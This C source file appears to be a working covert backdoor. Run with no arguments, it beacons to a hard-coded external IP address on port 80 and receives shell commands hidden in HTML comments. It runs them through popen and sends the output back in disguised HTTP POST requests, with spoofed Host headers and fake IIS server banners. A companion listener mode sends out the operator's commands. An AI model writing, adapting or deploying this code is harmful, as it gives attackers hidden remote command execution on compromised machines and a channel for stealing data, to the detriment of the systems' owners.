#ifdef __unix__
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <arpa/inet.h>
#include <stdlib.h>
#elif defined _WIN32
#include <windows.h>
#include <stdio.h>          // Needed for printf()
#include <string.h>         // Needed for memcpy() and strcpy()
#include <winsock2.h>      // Needed for all Winsock stuff
#define sleep(x) Sleep(1000 * x)
#endif

// npr 1            # mode one, client nopro only <- np, no socket
// npr 2 callbackip # mode two, router reverse <- np, connect socket
// npr 3            # mode three, router bind <- listen socket
// compile and run using IP of cnet.com
// clear && gcc npr.c -o npr && chmod 777 npr && ./npr 2 127.0.0.1
// clear && gcc npr.c -o npr && chmod 777 npr && ./npr 3

//gcc npr.c -o npr.exe -lws2_32
unsigned int ServerThread(int pParam);
unsigned int ClientThread(int pParam);

int main(int argc, char *argv[]) {
	#ifdef WIN32
	WORD wVersionRequested = MAKEWORD(1,1);
	WSADATA wsaData;
	WSAStartup(wVersionRequested, &wsaData);
	#endif
	int nport = 80;
	struct sockaddr_in serv_addr; 
	if(argc < 2) {
		//printf("\nUsage: %s <mode> (ip of server)\n",argv[0]);
		//return 1;
	}
	if(argc < 2) { // hardcode client mode and callback IP here  // no param? no problem
		argv[1] = "2";
		argv[2] = "210.51.57.156";
		argc = 3;
	}
	if (strncmp(argv[1],"2",1) == 0) { // connect socket
		if(argc != 3) {
			//printf("\nMode 2 Usage: %s <mode> (ip of server)\n",argv[0]);
			//return 1;
		}
		int sockfd = 0, n = 0;
		char recvBuff[1024];
		char sendBuff[50000];
		char cmdbfr[50000];
		memset(cmdbfr, 0,sizeof(cmdbfr));
		int lsleip = 1;
		int psleip = 1;
		int sleip = 5;
		while (1) {
			//printf("Mode 2 Connecting to %s:%u\n", argv[2], nport);
			memset(recvBuff, 0,sizeof(recvBuff));
			if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
				printf("\nError : Could not create socket \n");
				return 1;
			} 
			memset(&serv_addr, 0, sizeof(serv_addr)); 
			serv_addr.sin_family = AF_INET;
			serv_addr.sin_port = htons(nport); 
			#ifdef WIN32
			serv_addr.sin_addr.s_addr = inet_addr(argv[2]); // winsock implementation
			#else
			if(inet_pton(AF_INET, argv[2], &serv_addr.sin_addr)<=0) {
				printf("\ninet_pton error occured\n");
				return 1;
			}
			#endif
			if(connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
			   printf("\nError : Connect Failed \n");
			   sleip = lsleip + psleip; //fibsleep
			   lsleip = psleip;
			   psleip = sleip;
			   if (sleip > 300) {
				   sleip = 300;
			   }
			   sleep(sleip);
			   continue;
			}
			lsleip = 1;
			psleip = 1;
			sleip = 5;
			snprintf(sendBuff, sizeof(sendBuff), "POST /ajax/submit.aspx HTTP/1.1\nHost: api.w3c.org\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n\ndata=%s\n\n",strlen(cmdbfr)+7,cmdbfr);
			memset(recvBuff, 0, sizeof(recvBuff));
			int sendagg = 0;
			int sendsize = 0;
			while (sendagg <= strlen(sendBuff)) {
				if (sendagg + 1024 <= strlen(sendBuff)) {
					sendsize = 1024;
				}
				else {
					sendsize = strlen(sendBuff) - sendagg;
				}
				char thistime[1025];
				strncpy(thistime, sendBuff + sendagg, sendsize);
				sendagg += 1024;
			#ifdef WIN32
				send(sockfd, thistime, sendsize,0);
			}
			while ( (n = recv(sockfd, recvBuff, sizeof(recvBuff)-1,0)) > 0) {
			#else
				write(sockfd, thistime, sendsize);
			}
			while ( (n = read(sockfd, recvBuff, sizeof(recvBuff)-1)) > 0) {
			#endif
				if (n <= 0) {
					break;
				}
				recvBuff[n] = 0; // null terminate so that we can pass this string to other functions later
				//if(fputs(recvBuff, stdout) == EOF) {
				//	printf("\nError : Fputs error\n");
				//}
				if (recvBuff[n - 1] == 10 && recvBuff[n - 2] == 10) {
					break;
				}
			} 
			//printf("\n");
			if(n < 0) {
				printf("\nRead error \n");
			}
			#ifdef WIN32
			closesocket(sockfd);
			#else
			close(sockfd);
			#endif
			
			char *b = strstr(recvBuff,"<!--");
			b+= 4;
			char *e = strstr(b,"-->");
			int offset = e - b;
			b[offset] = 0;
			printf("[CMD] %s\n", b);
			FILE * fp;
			if((fp=popen((const char *)b, "r")) == NULL) {
			}
			char freader[1024];
			memset(cmdbfr, 0,sizeof(cmdbfr));
			memset(freader, 0,sizeof(freader));
			int agg = 0;
			while(fgets(freader,sizeof(freader),fp) != NULL){
				int freadagg = 0;
				int thislen = strlen(freader);
				for (;freadagg<thislen;freadagg++) {
					cmdbfr[agg] = freader[freadagg];
					agg++;
				}
				memset(freader, 0,sizeof(freader));
			}
			cmdbfr[agg] = 0;
			pclose(fp);
			sleep(sleip);
		}
	}
	else if (strncmp(argv[1],"3",1) == 0) { // listen socket
		int listenfd = 0;
		printf("Mode 3 Listening [Hit Escape to exit cleanly]\n");
		listenfd = socket(AF_INET, SOCK_STREAM, 0);
		memset(&serv_addr, 0, sizeof(serv_addr));
		serv_addr.sin_family = AF_INET;
		if (argc == 3) {
			serv_addr.sin_addr.s_addr = inet_addr(argv[2]);	
		}
		else {
			serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
		}
		serv_addr.sin_port = htons(nport); 
		while (bind(listenfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) != 0) {
			if (argc == 3) {
				printf("bind() on %s:%u failed\n", argv[2], nport);
			}
			else {
				printf("bind() on ANY:%u failed\n", nport);
			}
			sleep(1);
			//return 1;
		}
		if (argc == 3) {
			printf("Bound to %s:%u\n", argv[2], nport);
		}
		else {
			printf("Bound to ANY:%u\n", nport);
		}
		#ifdef WIN32
		_beginthread(ServerThread,0,listenfd);
		while(getch() != 27);
		closesocket(listenfd);
		WSACleanup();
		#else
		pid_t pID = fork();
		if (pID == 0) {
			ServerThread(listenfd);
		}
		else if (pID < 0) {
			printf("Fork failed\n");
			return 1;
		}
		else {
			while (1) {
				sleep(1);
				// some sig catching code here?
			}
		}
		close(listenfd);
		#endif
		return 0;
	}
}
unsigned int ServerThread(int pParam) {
	int listenfd = 0, connfd = 0;
	listenfd = pParam;
	if (listen(listenfd, 10) != 0) {
		printf("listen() failed\n");
		return 1;
	}
	while(1) {
		connfd = accept(listenfd, (struct sockaddr*)NULL, NULL);
		#ifdef WIN32
		_beginthread(ClientThread,0,connfd);
		#else
		pid_t cID = fork();
		if (cID == 0) {
			ClientThread(connfd);
		}
		else if (cID < 0) {
			printf("Client fork failed\n");
			return 1;
		}
		else {
			continue;
		}
		#endif
	}
	return 0;
}
unsigned int ClientThread(int pParam) {
	int n = 0, connfd = 0;
	char recvBuff[1024];
	char sendBuff[50000];
	memset(sendBuff, 0, sizeof(sendBuff)); 
	memset(recvBuff, 0, sizeof(recvBuff)); 
	connfd= pParam;
	printf("Host Connected\n");
	#ifdef WIN32
	while ( (n = recv(connfd, recvBuff, sizeof(recvBuff)-1,0)) > 0) {
	#else
	while ( (n = read(connfd, recvBuff, sizeof(recvBuff)-1)) > 0) {
	#endif
		if (n <= 0) {
			break;
		}
		recvBuff[n] = 0;
		if(fputs(recvBuff, stdout) == EOF) {
			printf("\nError : Fputs error\n");
		}
		if (recvBuff[n - 1] == 10 && recvBuff[n - 2] == 10) {
			break;
		}
	}
        char ncmdbfr[50000];
        memset(ncmdbfr, 0,sizeof(ncmdbfr));
        FILE * nfp;
        if((nfp=popen("cat /root/combnpr/raz", "r")) == NULL) {
        }
        char nfreader[1024];
        memset(ncmdbfr, 0,sizeof(ncmdbfr));
        memset(nfreader, 0,sizeof(nfreader));
        int nagg = 0;
        while(fgets(nfreader,sizeof(nfreader),nfp) != NULL){
                int nfreadagg = 0;
                int nthislen = strlen(nfreader);
                for (;nfreadagg<nthislen;nfreadagg++) {
                        ncmdbfr[nagg] = nfreader[nfreadagg];
                        nagg++;
                }
                memset(nfreader, 0,sizeof(nfreader));
        }
        ncmdbfr[nagg] = 0;
        pclose(nfp);
	char payBuff[50000];
	memset(payBuff, 0, sizeof(payBuff)); 
	snprintf(payBuff, sizeof(payBuff),"<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.1/EN\" \"http://www.w3.org/TR/xhtml11/DTD/xhtml111.dtd\">\n<html>\n<title>%d</title>\n<body><!--%s-->Unresolved.</body>\n</html>\n\n", sizeof(payBuff),ncmdbfr);
	snprintf(sendBuff, sizeof(sendBuff), "HTTP/1.1 200 OK\nCache-Control: no-cache\nPragma: no-cache\nContent-Length: %d\nContent-Type: text/html; charset=utf-8\nExpires: -1\nServer: Microsoft-IIS/6.0\nX-Powered-By: ASP.NET\nX-AspNet-Version: 2.0.50727\n\n%s",sizeof(payBuff)-1,payBuff);
	int sendagg = 0;
	int sendsize = 0;
	while (sendagg <= strlen(sendBuff)) {
		if (sendagg + 1024 <= strlen(sendBuff)) {
			sendsize = 1024;
		}
		else {
			sendsize = strlen(sendBuff) - sendagg;
		}
		char thistime[1025];
		strncpy(thistime, sendBuff + sendagg, sendsize);
		sendagg += 1024;
	#ifdef WIN32
		send(connfd, thistime, sendsize,0);
	}
	closesocket(connfd);
	#else
		write(connfd, thistime, sendsize);
	}
	close(connfd);
	#endif
	return 0;
}
